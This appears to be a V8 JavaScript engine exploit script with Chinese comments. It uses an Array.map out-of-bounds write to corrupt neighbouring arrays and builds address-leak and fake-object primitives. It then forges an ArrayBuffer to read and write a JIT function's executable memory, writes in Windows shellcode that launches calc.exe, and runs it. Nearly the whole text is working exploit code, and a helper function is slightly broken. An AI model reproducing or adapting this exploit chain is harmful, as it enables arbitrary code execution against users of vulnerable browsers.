String.prototype.padLeft =
Number.prototype.padLeft = function(total, pad) {
  return (Array(total).join(pad || 0) + this).slice(-total);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++){
        //print(bytes[i].toString(16));
        res.push(('0' + bytes[i].toString(16)).substr(-2));
    }
    return res.join('');

}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
        var chunk = data.slice(i, i+16);
    for (var i = 0; i < data.length; i += 16) {
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            //print(bigEndian.toString());
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        //print("toString");
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function hex(a) {
    if (a == undefined) return "0xUNDEFINED";
    var ret = a.toString(16);
    if (ret.substr(0,2) != "0x") return "0x"+ret;
    else return ret;
}

function lower(x) {
    // returns the lower 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;
}

function upper(x) {
    // returns the upper 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;
}


function lowerint(x) {
    // returns the lower 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-8,8),16) | 0;
}

function upperint(x) {
    // returns the upper 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-16, 8),16) | 0;
}

function combine(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    //print(a.toString());
    //print(b.toString());
    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);
}


//padLeft用于字符串左补位

function combineint(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);
}

function gc(){
  for (var i = 0; i < 1024 * 1024 * 16; i++){
    new String();
  }
}

function clear_space(){
  gc();
  gc();
}

function debug_stub(msg){
    console.log(msg);
    readline();
}

// ++++++++++++++++++++++++ yngwei exploit oob write ++++++++++++++++++++++
// a_是发生溢出的array，我们做如下布局：
/*
   Array(a_)+++++++Array_elements(a_)+++++++++++Array(oob_double)++++++++++++Array_elements(oob_double)++++++++++Array(oob_object)++++++++++++Array_elements(oob_object)
   通过Array_elements(a_)的溢出，完成指定偏移覆盖Array(oob_double)的Length以及Array_elements(oob_double)的length为比较大的值，从而构造一个
   用户空间对象(js脚本中能获得的对象，而不是v8 internal对象)的oob read/write，这样通过oob_double可以实现对Array_elements(oob_object)修改，因为是使用
   oob_double因此写入和读出Array_elements(oob_object)都是以double的形式写入和读出的，这样泄露和获取fake object引用的原语就搞定了，剩下的就是fake arraybuffer了
   获取整个内存空间的读写原语了。

   // 之后使用v9一样的fake过程，但是注意，不同版本v8，不仅arraybuffer map中的标识位不同，arraybuffer的结构也不同，例如什么地方写0x0000000000000004
   // 可能会出现dataview创建的时候发生dataview length为0但是fake arraybuffer length不为0（注意arraybuffer length想要设置成0x400的时候要将Length字段
   // 设置成0x40000000000）,此时说明arraybuffer结构构造的不对
*/


var oob_double = null;
var oob_object = null;

var ab = new ArrayBuffer(0x10);

//JS Func
function get_shell(){
  return 1 + 1;
}

class Array1 extends Array {
  constructor(len) {
    super(1);
    //construct adjacent objects.
    // clear_space();
    oob_double = new Array(0x20);
    oob_double.fill(2.2);
    // clear_space();
    oob_object = new Array(0x20);
    oob_object.fill({}); //Create an object waiting to be leak full with empty objects.
    // clear_space();
  }
};

class MyArray extends Array {
  static get [Symbol.species]() {
    return Array1;
  }
}

/*
  此处这样写是因为map的时候如果vul_array中对应地方的值是hole的话就不map，这样我们就可以完成指定偏移覆盖了，
  否则会覆盖掉oob array的map等字段
*/

vul_array = new MyArray();
debug_stub(vul_array instanceof Array1)
vul_array.length = 0x30;
vul_array[0] = 1;
vul_array[4] = 42;  //size1 
vul_array[8] = 42;  //size2 
vul_array[42] = 42; //position of length of oob_double array element 
console.log("vuln array is Array for current: \n" + vul_array)

//a_ is a copy made from vul_array, and it's very small. 
//after creation of a_, array.map thinks a_ is as long as origin array. 
//so do specified op on origin array 

a_ = vul_array.map(function(x) {
  if(x == 42){ //x refers to values inside origin array.
    //debug here on scene where oob write occurs!
    //%DebugPrint(a_);
    %DebugPrint(oob_double);
    %DebugPrint(oob_object);
    %DebugPrint(ab);
    //debug_stub("log variation");
    // console.log("oob obj");
    // %DebugPrint(oob_object);
    // console.log("arraybuffer");
    // %DebugPrint(ab);
    // readline();
    return 0x400; //return value will be put into new array, here without boundary check.
  }
}); 

console.log(oob_double.length);

%DebugPrint(a_); 
//console.log(a_); 
%DebugPrint(oob_double); 
%DebugPrint(oob_object); 
%DebugPrint(ab); 
debug_stub("After Mapping, inspecting oob_double array"); 

oob_double[1023] = 3.835460492599993e+175; //"say2abcd" mem searching to locate.
console.log(oob_double[1023]);

//right now, oob_double is right adjacent to next empty array.


function read_object_addr(leak){
  //oob_double[40] right points to oob_object[0], and interpret the object addr as a double.
  oob_object[0] = leak; 
  return oob_double[40];
}

function fake_object(fake_object){
  oob_double[41] = fake_object;
  return oob_object[1];
}

//consider these're testing elements.
print("0xdaba0000daba0000 float is " + (new Int64(0xdaba0000daba0000)).asDouble().toString());
print("0x000900c31f000008 float is " + (new Int64(0x000900c31f000008)).asDouble().toString());
print("0x00000000082003ff float is " + (new Int64(0x00000000082003ff)).asDouble().toString());

oob_object[0] = ab.__proto__; //put some weird __proto__ object at oob_object's start
// console.log(oob_object);
// console.log(oob_object.length);
// console.log(oob_object[0]);
// %DebugPrint(oob_object);
// %DebugPrint(ab);
// %DebugPrint(ab.__proto__);
// debug_stub("halt here.");

ab_proto_addr = read_object_addr(ab.__proto__);
print("[+] arraybuffer prototype address is @ " + Int64.fromDouble(ab_proto_addr).toString());
debug_stub("arraybuffer prototype address leaked.")
// fake_ab = fake_object(ab_addr);
// %DebugPrint(fake_ab);

//why this is ArrayBuffer's map?.
var ab_map_obj = [
  -1.1263976280432204e+129, //0xdaba0000daba0000L
  1.252018091549971e-308, //0x900c31f000008L
  6.73490047e-316, //0x82003ff
  ab_proto_addr,   // use ut32.prototype replace it
  ab_proto_addr,   
  0.0
];

// %DebugPrint(ab_map_obj);
// %DebugPrint(ab);
// debug_stub("compare map object.");

//we can fake this map just because:
//1. the unknown address at map start won't trigger anything bad.
//2. the needed ArrayBuffer.__proto__ address can be acquired.


//take back our self-faked arraybuffer map header from scratch~
ab_map_addr = read_object_addr(ab_map_obj) + 3.16e-322;

%DebugPrint(ab_map_obj);
debug_stub("examine fake map address.");

print("[+] arraybuffer map address is @ " + Int64.fromDouble(ab_map_addr).toString());
//debug_stub("wait?")

//this step gets get_shell JS_Function's ptr pointing to a code segment which permission is rwx.
//[function_addr] -> code_ptr.
function_addr = read_object_addr(get_shell) + 2.7e-322; //0x37 + 1.

%DebugPrint(oob_object); //object[0] where written.
%DebugPrint(ab_map_obj); //ab_map_obj 
%DebugPrint(get_shell);


print("[+] function address is @ " + Int64.fromDouble(function_addr).toString());
//debug_stub("stop debugging ab_map_addr.");

//fake out an ArrayBuffer to *steal* things from what cannot be leaked --> function_addr.
var fake_ab = [
  ab_map_addr,
  2.1729236899484e-311, 
  2.1729236899484e-311, 
  2.1729236899484e-311, /* buffer length */ // 0x40000000000L
  function_addr, //function_addr(leaked) -> code_ptr(target) -> rwx region(target).
  2e-323  
];

/* var meta_map_obj = [
  -1.1263976280432204e+129,
  3.3378910652751817e-308,
  1.036636e-317,
  -1.1263976280432204e+129,   // use ut32.prototype replace it
  -1.1263976280432204e+129,
  0.0
]; */


fake_ab_addr = read_object_addr(fake_ab) + 2.37e-322 + 8e-323;
print("[+] fake arraybuffer address is @ " + Int64.fromDouble(fake_ab_addr).toString());

%DebugPrint(fake_ab);
%DebugPrint(ab);

//debug_stub("exm fake arraybuffer address.");
// print("0x40000000000 float is " + (new Int64(0x40000000000)).asDouble().toString());



//first fake, target: code_ptr in JSFunction which a ptr to it is put into backing store of ArrayBuffer.
fake_ab = fake_object(fake_ab_addr); //get this object back from oob_object array, regard it as a ArrayBuffer.
%DebugPrint(oob_object);
//%DebugPrint(fake_ab);

//debug_stub("exm oob_object and fake arr buffer.");
//faking finished.

%DebugPrint(ab);
debug_stub("view at here.");

var fake_dv = new DataView(fake_ab); //use a DataView to enforce regard our faked object as "ArrayBuffer".
//%DebugPrint(fake_dv);

//get address right on func_addr.
code_address = (fake_dv.getFloat64(0, true));
print("[+] code address is @ " + Int64.fromDouble(code_address).toString());

debug_stub("code address got.");

//fake again for code writing.
var fake_ab = [
  ab_map_addr, 
  2.1729236899484e-311, 
  2.1729236899484e-311, 
  2.1729236899484e-311, /* buffer length */
  code_address, 
  2e-323 
];

fake_ab_addr = read_object_addr(fake_ab) + 2.37e-322 + 8e-323;
print("[+] fake arraybuffer address is @ " + Int64.fromDouble(fake_ab_addr).toString());

fake_ab = fake_object(fake_ab_addr);
fd = new DataView(fake_ab);
%DebugPrint(fd);
Math.sin(10);

var shellcode = [72, 131, 236, 40, 72, 131, 228, 240, 72, 199, 194, 96, 0, 0, 0, 101, 76, 139, 34, 77, 139, 100, 36, 24, 77, 139, 100, 36, 32, 77, 139, 36, 36, 77, 139, 36, 36, 77, 139, 100, 36, 32, 72, 186, 142, 78, 14, 236, 0, 0, 0, 0, 73, 139, 204, 232, 102, 0, 0, 0, 235, 56, 89, 255, 208, 72, 199, 194, 152, 254, 138, 14, 73, 139, 204, 232, 82, 0, 0, 0, 72, 139, 216, 77, 51, 201, 235, 60, 65, 88, 235, 42, 90, 72, 139, 202, 255, 211, 72, 199, 194, 197, 181, 73, 17, 73, 139, 204, 232, 49, 0, 0, 0, 72, 51, 201, 255, 208, 232, 195, 255, 255, 255, 117, 115, 101, 114, 51, 50, 46, 100, 108, 108, 0, 232, 209, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 232, 191, 255, 255, 255, 99, 97, 108, 99, 46, 101, 120, 101, 0, 76, 139, 233, 65, 139, 69, 60, 77, 139, 221, 76, 3, 232, 69, 139, 181, 136, 0, 0, 0, 77, 3, 243, 69, 139, 86, 24, 65, 139, 94, 32, 73, 3, 219, 103, 227, 60, 73, 255, 202, 66, 139, 52, 147, 73, 3, 243, 72, 51, 255, 72, 51, 192, 252, 172, 132, 192, 116, 7, 193, 207, 13, 3, 248, 235, 244, 59, 250, 117, 220, 65, 139, 94, 36, 73, 3, 219, 51, 201, 102, 66, 139, 12, 83, 65, 139, 94, 28, 73, 3, 219, 139, 4, 139, 73, 3, 195, 195];

for (var i = 0; i < shellcode.length; i++){
  print(i);
  fd.setUint8(i, shellcode[i]);
}

get_shell();


// print("0x40 float is " + (new Int64(0x10)).asDouble().toString());

// 和v9一样的fake arraybuffer过程